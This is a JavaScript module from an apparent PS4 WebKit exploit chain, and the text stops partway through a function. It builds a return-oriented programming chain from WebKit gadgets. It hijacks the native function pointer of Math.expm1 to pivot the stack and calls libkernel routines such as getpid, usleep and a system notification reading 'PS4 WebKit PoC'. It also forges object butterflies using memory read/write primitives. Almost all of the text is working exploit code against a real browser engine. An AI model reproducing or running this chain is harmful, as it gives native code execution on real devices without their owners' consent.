/**
 * Math.expm1 pivot native call — poops-style ROP (chain_poops.js).
 * Separate ArrayBuffers (same as chain_poops). Fire at PRIMITIVE-OK when lk known.
 */
import { int64 } from "./int64.js";
import { PIVOT_ROWS, verifyPivotSet, verifyPivotSetPrefix, checkPivotBytes } from "./pivot_gadgets.js";

/** Builtin used to enter native path after G0→m_function hook. ?pivotfn=parseInt if expm1 OOMs. */
const PIVOT_BUILTIN_MAP = {
    expm: function () { return Math.expm1; },
    expm1: function () { return Math.expm1; },
    parseint: function () { return parseInt; },
    parsefloat: function () { return parseFloat; },
    sin: function () { return Math.sin; },
    cos: function () { return Math.cos; },
    abs: function () { return Math.abs; },
};

export function resolvePivotBuiltin(name) {
    const key = (name || "expm1").toLowerCase().replace(/[^a-z0-9]/g, "");
    const get = PIVOT_BUILTIN_MAP[key];
    if (!get) throw new Error("unknown pivotfn: " + name + " (try parseint|expm1|sin)");
    const fn = get();
    if (typeof fn !== "function") throw new Error("pivotfn not available: " + key);
    return { fn, name: key };
}

export function firePivotTrigger(prep, argOverride) {
    if (!prep) throw new Error("firePivotTrigger: no prep");
    const trigger = prep.pivotTrigger || Math.expm1;
    if (argOverride !== undefined) return trigger(argOverride);
    if (prep.pivotFireArg !== undefined) return trigger(prep.pivotFireArg);
    return trigger(prep.pivotObj);
}

export const SYS = { getpid: 20, getuid: 0x18 };

const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const STACK_SIZE = 0x2000;

const GADGET_TABLE = [
    ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI_RET", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX_RET", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX_RET", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_R8_RET", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9_RET", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["POP_RAX_RET", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["LEAVE_RET", "wk_LEAVE_RET", [0xc9, 0xc3]],
    ["MOV_RDI_RAX_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
];

export { verifyPivotSet, verifyPivotSetPrefix, PIVOT_ROWS };

/** POP gadgets layoutNativeCall actually uses (not chain_poops argGadget[1..5]). */
export const CHAIN_POP_ROWS = [
    ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RAX", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["LEAVE", "wk_LEAVE_RET", [0xc9, 0xc3]],
];

/** Pivot G0-G5 + MOV_RDI_RAX + stack POP/LEAVE — chain_poops GAD table. */
export function verifyFullChainSet(read1, base, off) {
    const pivot = verifyPivotSet(read1, base, off);
    const popGood = [];
    const popBad = [];
    const popMissing = [];
    for (let i = 0; i < CHAIN_POP_ROWS.length; i++) {
        const label = CHAIN_POP_ROWS[i][0];
        const key = CHAIN_POP_ROWS[i][1];
        const pat = CHAIN_POP_ROWS[i][2];
        const rva = off[key];
        if (rva == null) {
            popMissing.push(label);
            continue;
        }
        if (checkPivotBytes(read1, base, rva, pat))
            popGood.push(label);
        else
            popBad.push(label);
    }
    return {
        ok: pivot.ok && popBad.length === 0 && popMissing.length === 0,
        pivot,
        popGood,
        popBad,
        popMissing,
    };
}

/** Prefix pivot + POP bytes — gate for bisect/native fire (not full poops tail). */
export function verifyBisectChainSet(read1, base, off) {
    const pivot = verifyPivotSetPrefix(read1, base, off);
    const popGood = [];
    const popBad = [];
    const popMissing = [];
    for (let i = 0; i < CHAIN_POP_ROWS.length; i++) {
        const label = CHAIN_POP_ROWS[i][0];
        const key = CHAIN_POP_ROWS[i][1];
        const pat = CHAIN_POP_ROWS[i][2];
        const rva = off[key];
        if (rva == null) {
            popMissing.push(label);
            continue;
        }
        if (checkPivotBytes(read1, base, rva, pat))
            popGood.push(label);
        else
            popBad.push(label);
    }
    return {
        ok: pivot.ok && popBad.length === 0 && popMissing.length === 0,
        pivot,
        popGood,
        popBad,
        popMissing,
    };
}

function resolveGadgetsTrust(webkitBase, off) {
    const G = {};
    for (let i = 0; i < GADGET_TABLE.length; i++) {
        const nm = GADGET_TABLE[i][0];
        const key = GADGET_TABLE[i][1];
        const rva = off[key];
        if (rva == null) return { G: null, bad: [nm] };
        G[nm] = webkitBase.add32(rva);
    }
    return { G, bad: [] };
}

function bufAddr(p, addrOff, ab) {
    const c = p.leakval(ab);
    return p.read8(p.read8(c.add32(addrOff.implOff)).add32(addrOff.dataOff));
}

/** Prove DataView writes land at primitive read addr (wrong impl chain → N0 OOM). */
function bufAddrRoundtrip(p, ab, implOff, dataOff) {
    const cell = p.leakval(ab);
    let impl = null;
    let data = null;
    try { impl = p.read8(cell.add32(implOff)); } catch (_) { return false; }
    if (!impl || impl.hi === 0) return false;
    try { data = p.read8(impl.add32(dataOff)); } catch (_) { return false; }
    if (!data || data.hi === 0) return false;
    const dv = new DataView(ab);
    const marker = 0xdeadbabe;
    dv.setUint32(0, marker, true);
    let got = null;
    try { got = p.read4(data); } catch (_) { return false; }
    if (got !== marker) return false;
    try { p.write4(data, new int64(0x600dc0de, 0)); } catch (_) { return false; }
    return dv.getUint32(0, true) === 0x600dc0de;
}

const BUFADDR_IMPL_CAND = [0x8, 0x10, 0x18, 0x20, 0x28, 0x30];
const BUFADDR_DATA_CAND = [0x8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38];

/** Find ArrayBuffer cell→impl→data chain where DV roundtrip matches primitive rw. */
export function resolveBufAddrOff(p, off) {
    if (!p || !off) return null;
    const probe = new ArrayBuffer(0x20);
    const tableImpl = off.wk_ArrayBuffer_m_impl;
    const tableData = off.wk_ArrayBuffer_m_contents_m_data;
    if (tableImpl != null && tableData != null
        && bufAddrRoundtrip(p, probe, tableImpl, tableData)) {
        return { implOff: tableImpl, dataOff: tableData, via: "table" };
    }
    for (let i = 0; i < BUFADDR_IMPL_CAND.length; i++) {
        const implOff = BUFADDR_IMPL_CAND[i];
        for (let j = 0; j < BUFADDR_DATA_CAND.length; j++) {
            const dataOff = BUFADDR_DATA_CAND[j];
            if (implOff === tableImpl && dataOff === tableData) continue;
            if (bufAddrRoundtrip(p, probe, implOff, dataOff))
                return { implOff, dataOff, via: "scan" };
        }
    }
    return null;
}

function readDvU64(dv, at) {
    const lo = dv.getUint32(at, true);
    const hi = dv.getUint32(at + 4, true);
    return new int64(lo, hi);
}

function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

/** chain_poops makeCtx — store / pivot / stack / frame are separate ArrayBuffers. */
function buildSlabCtx(p, addrOff, G, keepAlive, pivotSp) {
    pivotSp = pivotSp != null ? pivotSp : 0x38;
    const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
    const sb = new ArrayBuffer(0x20);
    const pb = new ArrayBuffer(PB_SIZE);
    const kb = new ArrayBuffer(STACK_SIZE);
    const fb = new ArrayBuffer(0x40);
    keepAlive.push(sb, pb, kb, fb);
    const storeDv = new DataView(sb);
    const pivotDv = new DataView(pb);
    const stackDv = new DataView(kb);
    const frameDv = new DataView(fb);
    const stackU8 = new Uint8Array(kb);
    const frameU8 = new Uint8Array(fb);
    const S = bufAddr(p, addrOff, sb);
    const P = bufAddr(p, addrOff, pb);
    const K = bufAddr(p, addrOff, kb);
    const F = bufAddr(p, addrOff, fb);
    put(storeDv, 0x00, G.G1);
    put(storeDv, 0x08, P);
    put(storeDv, 0x10, G.G3);
    put(storeDv, 0x18, G.G2);
    put(pivotDv, 0x00, P);
    put(pivotDv, 0x10, G.G5);
    put(pivotDv, 0x20, G.G4);
    return {
        stackSize: STACK_SIZE,
        pivotSp,
        storeDv,
        pivotDv,
        stackDv,
        frameDv,
        stackU8,
        frameU8,
        S,
        P,
        K,
        F,
        bufs: [sb, pb, kb, fb],
    };
}

/** Memory at slab addrs must match DataView (bad bufAddr reads garbage but "ok"). */
export function verifySlabContent(p, prep) {
    const out = { ok: true, reasons: [] };
    if (!prep || !prep.M || !prep.G)
        return { ok: false, reasons: ["no prep"] };
    const M = prep.M;
    const G = prep.G;
    function chk(label, memAddr, dv, dvOff, want) {
        let mem = null;
        try { mem = p.read8(memAddr); } catch (_) { mem = null; }
        const staged = readDvU64(dv, dvOff);
        const wantStr = String(want);
        if (!mem || String(mem) !== wantStr)
            out.reasons.push(label + " mem=" + mem + " want=" + wantStr);
        if (String(staged) !== wantStr)
            out.reasons.push(label + " dv=" + staged + " want=" + wantStr);
    }
    chk("S+0 G1", M.S, M.storeDv, 0x00, G.G1);
    chk("S+8 P", M.S.add32(8), M.storeDv, 0x08, M.P);
    chk("P+0 P", M.P, M.pivotDv, 0x00, M.P);
    chk("P+10 G5", M.P.add32(0x10), M.pivotDv, 0x10, G.G5);
    chk("P+20 G4", M.P.add32(0x20), M.pivotDv, 0x20, G.G4);
    if (prep._layout && prep._layout.rsp != null) {
        const sp = M.pivotSp;
        let rspMem = null;
        try { rspMem = p.read8(M.P.add32(sp)); } catch (_) { rspMem = null; }
        if (!rspMem || String(rspMem) !== String(prep._layout.rsp))
            out.reasons.push("P+0x" + sp.toString(16) + " rsp=" + rspMem
                + " want=" + prep._layout.rsp);
    }
    out.ok = out.reasons.length === 0;
    return out;
}

/** Stack qwords at RSP must match stackDv (layout written to K backing). */
export function verifyStackContent(p, prep) {
    const out = { ok: true, reasons: [] };
    if (!prep || !prep.M || !prep._layout || prep._layout.at == null)
        return { ok: false, reasons: ["no layout"] };
    const M = prep.M;
    const at = prep._layout.at;
    const n = Math.min(6, prep._layout.insts || 0);
    for (let i = 0; i < n; i++) {
        const staged = readDvU64(M.stackDv, at + 8 * i);
        let mem = null;
        try { mem = p.read8(M.K.add32(at + 8 * i)); } catch (_) { mem = null; }
        if (!mem || String(mem) !== String(staged))
            out.reasons.push("[" + i + "] mem=" + mem + " want=" + staged);
    }
    out.ok = out.reasons.length === 0;
    return out;
}

/** One ctx + pivot handles — call while heap is fresh (PRIMITIVE-OK). */
export function prepNativeChain(p, off, webkitBase, cap) {
    if (!p || !off || !webkitBase)
        throw new Error("prepNativeChain: need p, off, webkitBase");
    const resolved = resolveGadgetsTrust(webkitBase, off);
    if (!resolved.G || resolved.bad.length)
        throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
    const G = resolved.G;
    const addrOff = resolveBufAddrOff(p, off);
    if (!addrOff)
        throw new Error("prepNativeChain: bufAddr roundtrip failed — ArrayBuffer impl chain");
    const pivotSp = off.pivot_view_sp != null ? off.pivot_view_sp : 0x38;
    const keepAlive = [];
    const M = buildSlabCtx(p, addrOff, G, keepAlive, pivotSp);
    const slabOk = verifySlabContent(p, { M, G });
    if (!slabOk.ok)
        throw new Error("prepNativeChain: slab content: " + slabOk.reasons.join("; "));
    let mainMf, mainOrig, pivotObj, pivotCell;
    const pivotTrigger = (cap && cap.pivotTrigger) || Math.expm1;
    if (cap && cap.mainMf && cap.mainOrig != null) {
        mainMf = cap.mainMf;
        mainOrig = cap.mainOrig;
        pivotObj = cap.pivotObj;
        pivotCell = cap.pivotCell;
    } else {
        const cell = p.leakval(pivotTrigger);
        const jfn = p.read8(cell.add32(0x18));
        mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
        mainOrig = p.read8(mainMf);
        pivotObj = null;
        pivotCell = null;
    }
    if (!pivotObj) {
        pivotObj = {};
        pivotCell = p.leakval(pivotObj);
    }
    keepAlive.push(pivotObj);
    return {
        M,
        G,
        mainMf,
        mainOrig,
        pivotCell,
        pivotObj,
        keepAlive,
        webkitBase,
        pivotTrigger,
        pivotBuiltinName: (cap && cap.pivotBuiltinName) || "expm1",
        staged: false,
        mainArmed: false,
        _pinMainMf: mainMf,
        _pinMainOrig: mainOrig,
        _bufAddrOff: addrOff,
    };
}

function layoutNativeCall(M, G, target, args) {
    args = args || [];
    M.stackU8.fill(0);
    M.frameU8.fill(0);
    const insts = [];
    for (let i = 0; i < args.length; i++) {
        insts.push(G.POP_RDI_RET);
        insts.push(args[i]);
    }
    const targetIdx = insts.length;
    insts.push(target);
    insts.push(G.POP_RDI_RET);
    insts.push(M.F);
    insts.push(G.MOV_RDI_RAX_RET);
    insts.push(G.POP_RAX_RET);
    insts.push(JSVALUE_UNDEFINED);
    insts.push(G.LEAVE_RET);
    let at = STACK_SIZE - 8 * insts.length;
    if (((M.K.low + at + 8 * targetIdx) & 0xf) !== 0)
        at -= 8;
    for (let i = 0; i < insts.length; i++)
        put(M.stackDv, at + 8 * i, insts[i]);
    const rsp = M.K.add32(at);
    put(M.pivotDv, M.pivotSp, rsp);
    return { at, rsp, insts: insts.length, targetIdx };
}

/** SysV AMD64 — rdi, rsi, rdx, rcx then direct libkernel call (PS4 notify/usleep-style). */
function layoutNativeCall4(M, G, target, rdi, rsi, rdx, rcx) {
    M.stackU8.fill(0);
    M.frameU8.fill(0);
    const insts = [
        G.POP_RDI_RET, rdi,
        G.POP_RSI_RET, rsi,
        G.POP_RDX_RET, rdx,
        G.POP_RCX_RET, rcx,
        target,
        G.POP_RDI_RET, M.F,
        G.MOV_RDI_RAX_RET,
        G.POP_RAX_RET, JSVALUE_UNDEFINED,
        G.LEAVE_RET,
    ];
    const targetIdx = 8;
    let at = STACK_SIZE - 8 * insts.length;
    if (((M.K.low + at + 8 * targetIdx) & 0xf) !== 0)
        at -= 8;
    for (let i = 0; i < insts.length; i++)
        put(M.stackDv, at + 8 * i, insts[i]);
    const rsp = M.K.add32(at);
    put(M.pivotDv, M.pivotSp, rsp);
    return { at, rsp, insts: insts.length, targetIdx };
}

const NOTIFY_REQ_SIZE = 0xc30;
const NOTIFY_MSG_OFF = 0x2d;
const NOTIFY_ICON_OFF = 0x42d;
const NOTIFY_MSG_MAX = 1024;
const NOTIFY_ICON_MAX = 1024;
const DEFAULT_NOTIFY_MSG = "PS4 WebKit PoC";
const DEFAULT_NOTIFY_ICON = "cxml://psnotification/tex_icon_system";

/**
 * Notification struct layouts from working PS4 code:
 * - plain: mast1c0re 13.52 + notify.lua + elfldr (targetId=-1, useIcon=0, msg @ 0x2d)
 * - icon:  OpenOrbis / Al-Azif (useIcon=1 + iconUri @ 0x42d)
 */
function writeNotifyPlain(u8, dv, message) {
    message = message || DEFAULT_NOTIFY_MSG;
    for (let i = 0; i < NOTIFY_REQ_SIZE; i++) u8[i] = 0;
    dv.setInt32(0x00, 0, true);
    dv.setInt32(0x10, -1, true);
    dv.setInt32(0x28, 0, true);
    u8[0x2c] = 0;
    const msgLen = Math.min(message.length, NOTIFY_MSG_MAX - 1);
    for (let i = 0; i < msgLen; i++)
        u8[NOTIFY_MSG_OFF + i] = message.charCodeAt(i) & 0xff;
}

function writeNotifyIcon(u8, dv, message, iconUri) {
    message = message || DEFAULT_NOTIFY_MSG;
    iconUri = iconUri || DEFAULT_NOTIFY_ICON;
    for (let i = 0; i < NOTIFY_REQ_SIZE; i++) u8[i] = 0;
    dv.setInt32(0x00, 0, true);
    dv.setInt32(0x10, -1, true);
    dv.setInt32(0x28, 0, true);
    u8[0x2c] = 1;
    const msgLen = Math.min(message.length, NOTIFY_MSG_MAX - 1);
    for (let i = 0; i < msgLen; i++)
        u8[NOTIFY_MSG_OFF + i] = message.charCodeAt(i) & 0xff;
    const iconLen = Math.min(iconUri.length, NOTIFY_ICON_MAX - 1);
    for (let j = 0; j < iconLen; j++)
        u8[NOTIFY_ICON_OFF + j] = iconUri.charCodeAt(j) & 0xff;
}

function resolveNotifyFormat(opts) {
    const q = (opts && opts.format) || (typeof location !== "undefined"
        ? new URLSearchParams(location.search).get("notifyfmt") : null);
    if (q === "icon") return "icon";
    return "plain";
}

function writeNotifyStructAb(ab, message, iconUri, fmt) {
    const u8 = new Uint8Array(ab, 0, NOTIFY_REQ_SIZE);
    const dv = new DataView(ab);
    if (fmt === "icon") writeNotifyIcon(u8, dv, message, iconUri);
    else writeNotifyPlain(u8, dv, message);
}

function writeNotifyStructStack(M, message, iconUri, fmt) {
    if (fmt === "icon") writeNotifyIcon(M.stackU8, M.stackDv, message, iconUri);
    else writeNotifyPlain(M.stackU8, M.stackDv, message);
}

function writeNotifyStruct(p, addr, message, iconUri, fmt) {
    fmt = fmt || "plain";
    for (let i = 0; i < NOTIFY_REQ_SIZE; i++)
        p.write1(addr.add32(i), 0);
    p.write4(addr, new int64(0, 0));
    p.write4(addr.add32(0x10), new int64(0xffffffff, 0));
    p.write4(addr.add32(0x28), new int64(0, 0));
    p.write1(addr.add32(0x2c), fmt === "icon" ? 1 : 0);
    message = message || DEFAULT_NOTIFY_MSG;
    const msgLen = Math.min(message.length, NOTIFY_MSG_MAX - 1);
    for (let i = 0; i < msgLen; i++)
        p.write1(addr.add32(NOTIFY_MSG_OFF + i), message.charCodeAt(i) & 0xff);
    if (fmt === "icon") {
        iconUri = iconUri || DEFAULT_NOTIFY_ICON;
        const iconLen = Math.min(iconUri.length, NOTIFY_ICON_MAX - 1);
        for (let j = 0; j < iconLen; j++)
            p.write1(addr.add32(NOTIFY_ICON_OFF + j), iconUri.charCodeAt(j) & 0xff);
    }
}

function peekNotifyMsg(p, addr) {
    let s = "";
    for (let i = 0; i < 48; i++) {
        const c = p.read1(addr.add32(NOTIFY_MSG_OFF + i));
        if (c == null || c === 0) break;
        s += String.fromCharCode(c & 0xff);
    }
    return s;
}

function peekNotifyTargetId(p, addr) {
    try {
        const v = p.read4(addr.add32(0x10));
        return v != null ? ((v.low >>> 0) | 0) : null;
    } catch (_) {
        return null;
    }
}

function allocNotifyBuffer(p, addrOff, keepAlive, off) {
    const ab = new ArrayBuffer(NOTIFY_REQ_SIZE + 0x10);
    keepAlive.push(ab);
    let chain = addrOff;
    if (!bufAddrRoundtrip(p, ab, chain.implOff, chain.dataOff)) {
        const rescanned = off ? resolveBufAddrOff(p, off) : null;
        if (rescanned && bufAddrRoundtrip(p, ab, rescanned.implOff, rescanned.dataOff))
            chain = rescanned;
        else
            throw new Error("notify buffer: bufAddr failed");
    }
    const native = bufAddr(p, chain, ab);
    if (!native || (native.hi === 0 && native.low === 0))
        throw new Error("notify buffer: bufAddr failed");
    return { native, addrOff: chain, ab: ab };
}

export function stageNotify(p, prep, libkernelBase, off, opts) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("stageNotify: no prep");
    opts = opts || {};
    const fnOff = off.k_notify != null ? off.k_notify : 0x19320;
    const message = opts.message || DEFAULT_NOTIFY_MSG;
    const iconUri = opts.iconUri || DEFAULT_NOTIFY_ICON;
    const fmt = resolveNotifyFormat(opts);
    const useStack = opts.notifyBuf !== "ab";
    const M = prep.M;
    let buf;

    if (useStack) {
        buf = M.K;
        prep._layout = layoutNativeCall4(
            M, prep.G, libkernelBase.add32(fnOff),
            new int64(0, 0),
            buf,
            new int64(NOTIFY_REQ_SIZE, 0),
            new int64(0, 0));
        writeNotifyStructStack(M, message, iconUri, fmt);
    } else {
        const addrOff = prep._bufAddrOff || resolveBufAddrOff(p, off);
        if (!addrOff)
            throw new Error("stageNotify: bufAddr chain missing");
        prep._bufAddrOff = addrOff;
        if (!prep.keepAlive) prep.keepAlive = [];
        const nb = allocNotifyBuffer(p, addrOff, prep.keepAlive, off);
        buf = nb.native;
        if (nb.addrOff) prep._bufAddrOff = nb.addrOff;
        prep._layout = layoutNativeCall4(
            M, prep.G, libkernelBase.add32(fnOff),
            new int64(0, 0),
            buf,
            new int64(NOTIFY_REQ_SIZE, 0),
            new int64(0, 0));
        if (nb.ab) writeNotifyStructAb(nb.ab, message, iconUri, fmt);
        else writeNotifyStruct(p, buf, message, iconUri, fmt);
    }

    prep.notifyBuf = buf;
    prep.staged = true;
    prep.stagedKind = "notify";

    if (opts.log) {
        const peek = peekNotifyMsg(p, buf);
        const tid = peekNotifyTargetId(p, buf);
        const tidOk = tid === -1;
        opts.log("NOTIFY-FMT", fmt + " " + (useStack ? "stack@K" : "ab")
            + " buf=" + buf + " targetId=" + tid + (tidOk ? "" : " (want -1)")
            + " icon=" + (fmt === "icon" ? 1 : 0));
        opts.log("NOTIFY-STRUCT", "msg=\"" + peek + "\""
            + (peek === message.slice(0, 48) ? "" : " MISMATCH"));
    }
}

export function fireNotify(p, prep, libkernelBase, off, opts) {
    stageNotify(p, prep, libkernelBase, off, opts);
    return fireNativeCall(p, prep, off, opts && opts.fireOpts);
}

export function layoutGetpidSlab(M, G, stub) {
    layoutNativeCall(M, G, stub, []);
}

export function stageGetpid(p, prep, libkernelBase, off, stubOffOverride, opts) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("stageGetpid: no prep");
    opts = opts || {};
    let target;
    if (opts.stubAddr) {
        target = opts.stubAddr;
        prep.stubOff = opts.stubOff != null ? opts.stubOff : null;
    } else {
        let stubOff = stubOffOverride;
        if (stubOff == null && off.k_stubs && off.k_stubs[SYS.getpid] != null)
            stubOff = off.k_stubs[SYS.getpid];
        if (stubOff == null)
            stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
        target = libkernelBase.add32(stubOff);
        prep.stubOff = stubOff;
    }
    prep._layout = layoutNativeCall(prep.M, prep.G, target, []);
    prep.stubAddr = target;
    prep.staged = true;
    prep.stagedKind = "getpid";
}

export function stageUsleep(p, prep, libkernelBase, off, usec) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("stageUsleep: no prep");
    const fnOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
    const arg = new int64((usec != null ? usec : 1000) >>> 0, 0);
    prep._layout = layoutNativeCall(prep.M, prep.G, libkernelBase.add32(fnOff), [arg]);
    prep.staged = true;
}

/** Pivot only — webkit POP_RAX, no libkernel (bisect lk vs chain). */
export function layoutSmokeStack(prep) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("layoutSmokeStack: no prep");
    prep._layout = layoutNativeCall(prep.M, prep.G, prep.G.POP_RAX_RET, [new int64(0, 0)]);
    prep.staged = true;
    prep.stagedKind = "smoke";
}

/** Pre-N5 log: pivotDv slots + RSP target + first stack qwords. */
export function describeSlabLayout(p, prep) {
    if (!prep || !prep.M)
        throw new Error("describeSlabLayout: no prep");
    const M = prep.M;
    const sp = M.pivotSp;
    const rspLo = M.pivotDv.getUint32(sp, true);
    const rspHi = M.pivotDv.getUint32(sp + 4, true);
    const rsp = new int64(rspLo, rspHi);
    const top = [];
    if (prep._layout && prep._layout.at != null) {
        const at = prep._layout.at;
        for (let i = 0; i < 4; i++) {
            const lo = M.stackDv.getUint32(at + 8 * i, true);
            const hi = M.stackDv.getUint32(at + 8 * i + 4, true);
            top.push(new int64(lo, hi));
        }
    }
    let pivotPeek = null;
    if (prep.pivotCell && p)
        pivotPeek = p.read8(prep.pivotCell);
    return {
        S: M.S,
        P: M.P,
        K: M.K,
        F: M.F,
        pivotSp: sp,
        rsp,
        layout: prep._layout || null,
        stackTop: top,
        pivotCell: prep.pivotCell,
        pivotPeek,
        G5: prep.G && prep.G.G5,
    };
}

function pivotHookCell(prep, off) {
    let hookOff = 0;
    if (off && off.pivot_hook_off != null)
        hookOff = off.pivot_hook_off;
    if (typeof sessionStorage !== "undefined") {
        try {
            const q = sessionStorage.getItem("wk-pivot-hook-off");
            if (q != null && q !== "")
                hookOff = parseInt(q, 16);
        } catch (_) { }
    }
    return prep.pivotCell.add32(hookOff);
}

/** True when prep was built @ Start with old pivot RVAs (slab still has stale G1-G5). */
export function prepGadgetRvaStale(prep, off) {
    if (!prep || !prep.G || !prep.webkitBase || !off) return true;
    const wb = prep.webkitBase;
    const keys = [
        ["G0", "wk_MOV_RDI_RSI_30_CALL"],
        ["G5", "wk_PUSH_RDX_POP_RSP_RET"],
    ];
    for (let i = 0; i < keys.length; i++) {
        const nm = keys[i][0];
        const key = keys[i][1];
        const rva = off[key];
        if (rva == null || !prep.G[nm]) continue;
        const want = wb.add32(rva);
        if (String(prep.G[nm]) !== String(want)) return true;
    }
    return false;
}

/** Rewrite slab store/pivot slots from current offset table (no new ArrayBuffers). */
export function refreshPrepSlabGadgets(prep, off, webkitBase) {
    if (!prep || !prep.M || !off || !webkitBase)
        throw new Error("refreshPrepSlabGadgets: bad args");
    const resolved = resolveGadgetsTrust(webkitBase, off);
    if (!resolved.G || resolved.bad.length)
        throw new Error("refreshPrepSlabGadgets: " + resolved.bad.join(","));
    const stale = prepGadgetRvaStale(prep, off);
    prep.G = resolved.G;
    const G = prep.G;
    const M = prep.M;
    put(M.storeDv, 0x00, G.G1);
    put(M.storeDv, 0x08, M.P);
    put(M.storeDv, 0x10, G.G3);
    put(M.storeDv, 0x18, G.G2);
    put(M.pivotDv, 0x00, M.P);
    put(M.pivotDv, 0x10, G.G5);
    put(M.pivotDv, 0x20, G.G4);
    if (prep.staged) {
        if (prep.stagedKind === "smoke")
            layoutSmokeStack(prep);
        else if (prep.stagedKind === "getpid" && prep.stubOff != null
            && prep._layout && prep.M && prep.G) {
            /* stub addr re-staged by caller if lk known */
        }
    }
    prep._staleRefreshed = stale;
    return stale;
}

/** Can primitive read slab backing addrs (bad bufAddr → OOM @ G5). */
export function verifySlabAddrs(p, prep) {
    if (!prep || !prep.M)
        throw new Error("verifySlabAddrs: no prep");
    const M = prep.M;
    const names = ["S", "P", "K", "F"];
    const addrs = [M.S, M.P, M.K, M.F];
    const out = {};
    for (let i = 0; i < names.length; i++) {
        let ok = false;
        try {
            ok = p.read8(addrs[i]) != null;
        } catch (_) { ok = false; }
        out[names[i]] = { addr: addrs[i], ok };
    }
    if (prep._layout && prep._layout.rsp) {
        let ok = false;
        try {
            ok = p.read8(prep._layout.rsp) != null;
        } catch (_) { ok = false; }
        out.rsp = { addr: prep._layout.rsp, ok };
    }
    return out;
}

/** PS4 gigacage / heap pointer (not strict hi>0 — some reads use low-only layout). */
export function isPlausibleHeapPtr(v) {
    if (!v) return false;
    if (v.hi === 0 && v.low === 0) return false;
    if (v.hi === 0 && v.low < 0x10000) return false;
    if ((v.low & 7) !== 0) return false;
    const n = (v.hi * 0x100000000) + (v.low >>> 0);
    if (n >= 0x100000000 && n < 0x1000000000) return true;
    return v.hi > 0 && v.hi <= 0xffff;
}

const BF_CELL_OFFS = [0x8, 0x10, 0x18, 0x20];

export function readPivotButterfly(p, pivotCell) {
    if (!p || !pivotCell) return null;
    let q = null;
    try { q = p.read8(pivotCell.add32(0x8)); } catch (_) { q = null; }
    return isPlausibleHeapPtr(q) ? { bf: q, cellOff: 0x8 } : null;
}

function pivotBfCandidates(carrier) {
    const out = [];
    out.push({ tag: "array", obj: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] });
    out.push({ tag: "props", obj: { __p0: 1, __p1: 2, __p2: 3, __p3: 4, __p4: 5, __p5: 6 } });
    if (carrier && carrier.textarea)
        out.push({ tag: "ta", obj: carrier.textarea });
    try {
        const ta = document.createElement("textarea");
        ta.value = "pivot";
        out.push({ tag: "fresh-ta", obj: ta });
    } catch (_) { }
    return out;
}

function setPivotObj(p, prep, obj, tag) {
    prep.pivotObj = obj;
    prep.pivotCell = p.leakval(obj);
    if (prep.keepAlive && prep.keepAlive.indexOf(obj) < 0)
        prep.keepAlive.push(obj);
    prep._pivotBfUpgraded = tag;
}

/** Write controlled backing store addr into pivotCell+0x8 (empty {} has null butterfly). */
export function injectFakeButterfly(p, prep) {
    if (!prep || !prep.pivotCell || !prep._bufAddrOff)
        throw new Error("injectFakeButterfly: no prep/bufAddrOff");
    if (!prep._fakeBfAb) {
        prep._fakeBfAb = new ArrayBuffer(0x80);
        if (prep.keepAlive) prep.keepAlive.push(prep._fakeBfAb);
    }
    const bfAddr = bufAddr(p, prep._bufAddrOff, prep._fakeBfAb);
    if (!isPlausibleHeapPtr(bfAddr))
        throw new Error("injectFakeButterfly: fake bf addr bad " + bfAddr);
    if (!prep._bisect) prep._bisect = {};
    const site = prep.pivotCell.add32(0x8);
    if (prep._bisect.fakeBfCellSaved == null) {
        prep._bisect.fakeBfCellSaved = p.read8(site);
        prep._bisect.fakeBfCellSite = site;
    }
    p.write8(site, bfAddr);
    prep._pivotBfInjected = true;
    prep._pivotBfSource = "inject@" + bfAddr;
    return bfAddr;
}

/** Resolve butterfly for bf hooks — scan, swap pivot, or inject fake @ cell+0x8. */
export function ensurePivotButterfly(p, prep, carrier) {
    if (!prep || !prep.pivotCell)
        throw new Error("ensurePivotButterfly: no prep");
    let hit = readPivotButterfly(p, prep.pivotCell);
    if (hit) {
        prep._pivotBfSource = "cell+0x" + hit.cellOff.toString(16);
        return hit.bf;
    }
    const cands = pivotBfCandidates(carrier);
    for (let i = 0; i < cands.length; i++) {
        const c = cands[i];
        setPivotObj(p, prep, c.obj, c.tag);
        hit = readPivotButterfly(p, prep.pivotCell);
        if (hit) {
            prep._pivotBfSource = c.tag + "+0x" + hit.cellOff.toString(16);
            return hit.bf;
        }
    }
